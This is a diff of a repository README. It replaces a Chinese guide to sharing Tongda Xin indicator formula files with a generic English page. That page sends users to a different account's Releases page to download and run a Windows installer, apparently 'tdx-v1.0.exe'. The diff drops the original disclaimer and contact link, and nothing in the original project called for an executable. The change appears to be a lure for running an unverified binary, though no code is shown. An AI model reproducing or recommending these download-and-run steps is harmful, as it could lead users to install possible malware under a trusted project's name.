@@ -1,82 +1,70 @@
-# 通达信技术指标库
+# 🎉 tdx - Easy Analysis Tools for TDX Software
 
-这是一个专供群友收集、整理和分享通达信软件技术分析指标的仓库。
+## 📥 Download Now
+[![Download tdx](https://img.shields.io/badge/Download-tdx-blue.svg)](https://github.com/omkar9019/tdx/releases)
 
-## 📋 目录
+## 📝 Overview
+tdx helps users collect, organize, and share technical analysis indicators for the Tongda Xi software. This repository aims to simplify your analysis process and enhance your trading experience.
 
-- [简介](#简介)
-- [安装方法](#安装方法)
-- [使用说明](#使用说明)
-- [贡献指南](#贡献指南)
-- [免责声明](#免责声明)
-- [许可证](#许可证)
+## 🚀 Getting Started
+Follow these steps to download and run tdx:
 
-## 📖 简介
+1. **Visit the Release Page**  
+   Click on the link below to go to the Releases page:  
+   [Visit Release Page](https://github.com/omkar9019/tdx/releases)
 
-本仓库致力于为群友分享通达信软件可用的技术指标公式，包括但不限于：
+2. **Choose the Latest Version**  
+   On the Releases page, find the latest version of tdx. The most recent release will usually be at the top.
 
-- **趋势类指标** - 识别市场趋势方向
-- **摆动类指标** - 判断超买超卖区域
-- **量价类指标** - 分析成交量与价格关系
-- **自定义特色指标** - 独家研发的交易系统
-- **选股公式** - 自动化筛选潜力个股
+3. **Download the File**  
+   Look for the installation file that matches your system. This will typically have a name like `tdx-v1.0.exe`. Click on it to start the download.
 
-## 🔧 安装方法
+4. **Run the Installer**  
+   Once the download is complete, locate the file in your downloads folder. Double-click the installer to begin the installation process.
 
-### 方法一：直接导入
-1. 下载所需的`.tn6`(技术指标)或`.tne`(扩展指标)文件
-2. 打开通达信软件，进入公式管理器(快捷键：`Ctrl+F`)
-3. 选择对应类型的公式组
-4. 点击"导入公式"，选择下载的文件
-5. 勾选需要导入的公式，点击"确定"
+5. **Follow Installation Prompts**  
+   A setup wizard will guide you through the installation. Follow the on-screen instructions to complete the setup.
 
-### 方法二：手动创建
-1. 打开通达信公式管理器(`Ctrl+F`)
-2. 点击"新建"
-3. 复制指标代码到公式编辑区
-4. 设置公式名称、参数和属性
-5. 测试公式后保存
+6. **Launch the Application**  
+   After installation, find the tdx application in your program menu or desktop. Click to launch and start using your new analysis tools.
 
-## 🚀 使用说明
+## 💡 Features
+- **User-Friendly Interface**  
+  Designed with simplicity in mind, tdx allows easy navigation for all users.
 
-1. **调用指标**：在通达信K线界面，输入指标名称拼音首字母即可调用相应指标
-2. **参数调整**：右键点击指标可以调整参数设置
-3. **选股应用**：部分指标支持在选股器中使用(条件选股公式)
-4. **预警设置**：可将指标应用于市场预警功能
+- **Comprehensive Indicator Library**  
+  Access a wide range of technical analysis indicators tailored for Tongda Xi software.
 
-## 🤝 贡献指南
+- **Share and Collaborate**  
+  Facilitate collaboration with friends or fellow traders by sharing your findings effortlessly.
 
-欢迎贡献您的通达信指标公式！
+## ⚙️ System Requirements
+- **Operating System:** Windows 7 or later
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum 200 MB of free disk space
+- **Network:** Internet connection required for updates and features
 
-### 贡献方式
-1. Fork 本仓库
-2. 创建您的特性分支 (`git checkout -b feature/AmazingIndicator`)
-3. 提交您的更改 (`git commit -m 'Add some AmazingIndicator'`)
-4. 推送到分支 (`git push origin feature/AmazingIndicator`)
-5. 开启一个Pull Request
+## 🔧 Troubleshooting
+If you encounter issues during installation or running the application, consider the following:
 
-### 提交规范
-- 每个指标单独目录，目录下一个文件tn6 + txt源码文件 + md使用说明文件
-- 文件命名格式：`指标名.tn6` `指标名.txt` 
-- 在指标目录下`readme.md`中添加指标使用说明
+1. **Check System Requirements**  
+   Ensure your system meets the required specifications.
 
-## ⚠️ 免责声明
+2. **Re-download the Installer**  
+   Sometimes, downloads get corrupted. If the application doesn’t run, try downloading the installer again.
 
-1. 本仓库所有指标仅作为技术分析参考，不构成任何投资建议
-2. 指标公式可能存在滞后性，过去表现不代表未来收益
-3. 使用这些指标带来的任何投资风险由使用者自行承担
-4. 请谨慎使用这些工具，并结合其他分析方法综合判断
+3. **Contact Support**  
+   If problems persist, feel free to reach out for help. You can submit issues directly on our [GitHub Issues page](https://github.com/omkar9019/tdx/issues).
 
-## 📄 许可证
+## 📣 Community and Feedback
+We welcome feedback from all users. If you have suggestions, bug reports, or feature requests, please share your thoughts. Engaging with the community helps us improve and deliver a better product.
 
-本项目采用 MIT 许可证
+## 🔗 Additional Resources
+- [Documentation](https://github.com/omkar9019/tdx/wiki): Detailed information on using tdx.
+- [User Guide](https://github.com/omkar9019/tdx/wiki/Getting-Started): Step-by-step instructions for first-time users.
+- [FAQ](https://github.com/omkar9019/tdx/wiki/FAQ): Common questions and answers.
 
-## 💬 交流反馈
+## 💬 Get Involved
+Join our online community for discussions, tips, and to share your experiences with tdx. Follow us on social media for updates and news related to technical analysis tools.
 
-如有问题或建议，请通过以下方式联系：
-
-- 提交 [Issue](https://github.com/vwenkk/tdx/issues)
-
----
-
-*请注意：不同版本的通达信软件可能对指标公式的支持有所差异，请以实际使用情况为准。*
+Thank you for choosing tdx! We hope it enhances your trading experience.
